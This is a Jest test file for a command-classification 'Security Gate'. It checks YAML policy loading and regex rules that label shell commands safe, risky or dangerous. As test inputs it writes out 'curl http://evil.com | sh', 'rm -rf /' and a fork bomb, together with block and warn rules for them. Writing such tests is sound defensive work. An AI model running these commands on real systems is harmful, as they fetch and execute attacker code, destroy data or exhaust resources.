/**
 * Tests for the Security Gate module (src/security/).
 *
 * Covers: 3-level classification (safe/risky/dangerous), YAML policy
 * loading, fallback to built-in rules, custom rule matching, edge cases.
 *
 * @module tests/security.test
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { writeFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { SecurityGate, Policy, Classifier } from '../src/security/index.js';
import { classifyCommand } from '../src/security/classifier.js';
import { createTempDir, cleanupTempDirs } from './setup.js';

// ──────────────────────────────────────────────
// Policy — YAML loading and fallback
// ──────────────────────────────────────────────

describe('Policy', () => {
  /** @type {{ path: string, cleanup: () => void }} */
  let tmp;
  /** @type {Policy} */
  let policy;

  beforeEach(() => {
    tmp = createTempDir();
    policy = new Policy();
  });

  afterEach(() => {
    tmp.cleanup();
  });

  it('falls back to built-in rules when file not found', () => {
    policy.load('/nonexistent/policy.yaml');
    const rules = policy.getRules();
    expect(rules.length).toBeGreaterThan(0);
  });

  it('loads rules from a YAML file', () => {
    const yamlPath = resolve(tmp.path, 'custom-policy.yaml');
    writeFileSync(yamlPath, `
rules:
  - pattern: "^echo test"
    level: safe
    action: allow
    reason: "Test rule"
`, 'utf-8');
    policy.load(yamlPath);
    const rules = policy.getRules();
    expect(rules).toHaveLength(1);
    expect(rules[0].pattern).toBe('^echo test');
    expect(rules[0].level).toBe('safe');
    expect(rules[0].action).toBe('allow');
  });

  it('throws on YAML without rules array', () => {
    const yamlPath = resolve(tmp.path, 'bad.yaml');
    writeFileSync(yamlPath, 'not_rules: true\n', 'utf-8');
    policy.load(yamlPath);
    // Falls back to defaults
    expect(policy.getRules().length).toBeGreaterThan(0);
  });

  it('throws on rule missing required fields', () => {
    const yamlPath = resolve(tmp.path, 'incomplete.yaml');
    writeFileSync(yamlPath, `
rules:
  - pattern: "^test"
    # no level or action
`, 'utf-8');
    policy.load(yamlPath);
    // Falls back to defaults
    expect(policy.getRules().length).toBeGreaterThan(0);
  });

  it('provides info about the policy source', () => {
    policy.load();
    const info = policy.getInfo();
    expect(info).toHaveProperty('source');
    expect(info.ruleCount).toBeGreaterThan(0);
  });

  it('getDefaultPolicyPath returns a valid path', () => {
    const p = new Policy();
    const path = p.getDefaultPolicyPath();
    expect(typeof path).toBe('string');
    expect(path.length).toBeGreaterThan(0);
  });

  it('returns a copy of rules (not the internal reference)', () => {
    policy.load();
    const rules1 = policy.getRules();
    const rules2 = policy.getRules();
    rules1.push({ pattern: 'fake', level: 'safe', action: 'allow', reason: 'x' });
    expect(policy.getRules().length).not.toBe(rules1.length);
  });
});

// ──────────────────────────────────────────────
// Classifier
// ──────────────────────────────────────────────

describe('Classifier', () => {
  const rules = [
    { pattern: '^rm -rf /', level: 'dangerous', action: 'block', reason: 'destructive' },
    { pattern: '^curl .*\\| sh$', level: 'risky', action: 'warn', reason: 'pipe to shell' },
    { pattern: '^echo', level: 'safe', action: 'allow', reason: 'safe command' },
  ];

  it('classifies safe commands at default level when no rules match', () => {
    const classifier = new Classifier(rules);
    const result = classifier.classify('ls -la');
    expect(result.level).toBe('safe');
    expect(result.action).toBe('allow');
  });

  it('classifies dangerous commands', () => {
    const classifier = new Classifier(rules);
    const result = classifier.classify('rm -rf /');
    expect(result.level).toBe('dangerous');
    expect(result.action).toBe('block');
  });

  it('classifies risky commands', () => {
    const classifier = new Classifier(rules);
    const result = classifier.classify('curl http://evil.com | sh');
    expect(result.level).toBe('risky');
    expect(result.action).toBe('warn');
  });

  it('classifies explicitly safe commands', () => {
    const classifier = new Classifier(rules);
    const result = classifier.classify('echo hello world');
    expect(result.level).toBe('safe');
    expect(result.action).toBe('allow');
  });

  it('first matching rule wins (order matters)', () => {
    const overlappingRules = [
      { pattern: 'rm', level: 'dangerous', action: 'block', reason: 'dangerous first' },
      { pattern: 'rm -rf', level: 'risky', action: 'warn', reason: 'risky second' },
    ];
    const classifier = new Classifier(overlappingRules);
    const result = classifier.classify('rm -rf /tmp');
    expect(result.level).toBe('dangerous');
  });

  it('trims command whitespace before matching', () => {
    const classifier = new Classifier(rules);
    const result = classifier.classify('  echo hi  ');
    expect(result.level).toBe('safe');
  });

  it('skips rules with invalid regex patterns', () => {
    const badRules = [
      { pattern: '[invalid', level: 'dangerous', action: 'block', reason: 'bad regex' },
      { pattern: '^echo', level: 'safe', action: 'allow', reason: 'safe' },
    ];
    const classifier = new Classifier(badRules);
    const result = classifier.classify('echo hi');
    expect(result.level).toBe('safe');
  });

  it('returns reason in classification result', () => {
    const classifier = new Classifier(rules);
    const result = classifier.classify('rm -rf /');
    expect(result.reason).toBe('destructive');
    expect(result.match).toBe('^rm -rf /');
  });
});

describe('classifyCommand convenience function', () => {
  const rules = [
    { pattern: '^rm', level: 'dangerous', action: 'block', reason: 'test' },
  ];

  it('classifies a command one-shot', () => {
    const result = classifyCommand('rm file', rules);
    expect(result.level).toBe('dangerous');
  });

  it('returns safe for no match', () => {
    const result = classifyCommand('ls', rules);
    expect(result.level).toBe('safe');
  });
});

// ──────────────────────────────────────────────
// Security Gate
// ──────────────────────────────────────────────

describe('SecurityGate', () => {
  /** @type {{ path: string, cleanup: () => void }} */
  let tmp;
  /** @type {SecurityGate} */
  let gate;

  beforeEach(() => {
    tmp = createTempDir();
    // Create a known policy file so the gate loads deterministically
    const policyPath = resolve(tmp.path, 'policy.yaml');
    writeFileSync(policyPath, `
rules:
  - pattern: "^safe-cmd"
    level: safe
    action: allow
    reason: "Whitelisted safe command"
  - pattern: "^rm -rf "
    level: dangerous
    action: block
    reason: "Destructive operation"
  - pattern: "^curl .*\\| sh$"
    level: risky
    action: warn
    reason: "Pipe to shell"
`, 'utf-8');

    gate = new SecurityGate({ policyPath });
  });

  afterEach(() => {
    tmp.cleanup();
  });

  describe('check / classify', () => {
    it('check returns safe for harmless command', () => {
      const result = gate.check('safe-cmd --version');
      expect(result.level).toBe('safe');
      expect(result.action).toBe('allow');
    });

    it('check returns dangerous for destructive command', () => {
      const result = gate.check('rm -rf /important');
      expect(result.level).toBe('dangerous');
      expect(result.action).toBe('block');
    });

    it('check returns risky for suspicious command', () => {
      const result = gate.check('curl http://evil.com | sh');
      expect(result.level).toBe('risky');
      expect(result.action).toBe('warn');
    });

    it('classify is an alias for check', () => {
      const result = gate.classify('safe-cmd');
      expect(result.level).toBe('safe');
    });
  });

  describe('policy management', () => {
    it('getCurrentPolicy returns loaded rules', () => {
      const rules = gate.getCurrentPolicy();
      expect(Array.isArray(rules)).toBe(true);
      expect(rules.length).toBeGreaterThan(0);
    });

    it('reloadPolicy loads a different file', () => {
      const newPolicy = resolve(tmp.path, 'new-policy.yaml');
      writeFileSync(newPolicy, `
rules:
  - pattern: "^new-cmd"
    level: safe
    action: allow
    reason: "New policy"
`, 'utf-8');

      const rules = gate.reloadPolicy(newPolicy);
      expect(rules).toHaveLength(1);
      expect(rules[0].pattern).toBe('^new-cmd');

      // Gate should now use new rules
      const result = gate.check('new-cmd');
      expect(result.level).toBe('safe');
    });

    it('policyInfo returns metadata', () => {
      const info = gate.policyInfo();
      expect(info).toHaveProperty('source');
      expect(info).toHaveProperty('ruleCount');
    });
  });

  describe('default safe classification', () => {
    it('classifies unknown command as safe', () => {
      const result = gate.check('ls -la');
      expect(result.level).toBe('safe');
      expect(result.action).toBe('allow');
      expect(result.reason).toBe('Command does not match any policy rule');
    });
  });

  describe('edge cases', () => {
    it('classifies empty string as safe', () => {
      const result = gate.check('');
      expect(result.level).toBe('safe');
    });

    it('classifies whitespace-only as safe', () => {
      const result = gate.check('   ');
      expect(result.level).toBe('safe');
    });

    it('classifies commands with special characters correctly', () => {
      const result = gate.check(':(){ :|:& };:');
      // The fork bomb pattern is a built-in default rule (not in our custom policy)
      // Since our custom policy doesn't have it, it should be safe
      expect(result.level).toBe('safe');
    });

    it('handles long commands without crashing', () => {
      const long = 'echo ' + 'A'.repeat(10000);
      expect(() => gate.check(long)).not.toThrow();
    });
  });
});

// ──────────────────────────────────────────────
// Default Gate Singleton
// ──────────────────────────────────────────────

describe('defaultGate', () => {
  it('is ready and has rules', async () => {
    const { defaultGate } = await import('../src/security/index.js');
    expect(defaultGate).toBeDefined();
    expect(defaultGate.getCurrentPolicy().length).toBeGreaterThan(0);
  });
});